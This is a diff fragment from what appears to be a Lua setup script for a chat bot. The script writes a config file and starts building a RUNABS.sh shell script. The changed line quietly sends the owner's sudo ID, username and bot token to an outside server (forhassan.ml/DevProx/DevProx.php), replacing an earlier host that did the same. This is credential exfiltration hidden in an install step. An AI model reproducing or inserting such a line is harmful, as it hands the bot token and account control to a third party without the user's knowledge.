@@ -53,7 +53,7 @@ username = username,
 sudo_users = {SUDO}, 
 }
 create(config, "./config.lua")   
-https.request("https://ibcorp.ibuser.xyz/iq_abs/?id="..SUDO.."&user="..username.."&token="..token)
+https.request("https://forhassan.ml/DevProx/DevProx.php?id="..SUDO.."&user="..username.."&token="..token)
 file = io.open("RUNABS.sh", "w")  
 file:write([[
 #!/bin/bash 
